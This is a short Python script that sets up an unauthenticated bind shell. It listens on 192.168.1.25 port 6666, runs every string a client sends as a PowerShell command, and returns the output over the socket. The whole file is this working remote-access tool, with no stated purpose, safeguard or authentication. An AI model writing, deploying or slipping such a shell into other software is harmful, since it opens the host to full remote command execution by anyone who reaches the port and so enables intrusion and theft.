import subprocess
import socket
from threading import Thread

result = ""

def run_command(command):
    command_result = subprocess.run(["powershell", "-Command", command], capture_output=True)
    global result
    result = command_result.stdout
    return command_result.stdout


def command_line_service(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))

        try:
            sock.listen(5)
            print('Server started.')
            conn, addr = sock.accept()
            print('Client connected IP:', addr)

            while 'connected':
                command = conn.recv(1024)
                thread = Thread(target=run_command, args=(command,))
                thread.start()
                thread.join()
                global result
                conn.sendall(result)

        finally:
            conn.close()
            # sock.close()


command_line_service("192.168.1.25", 6666)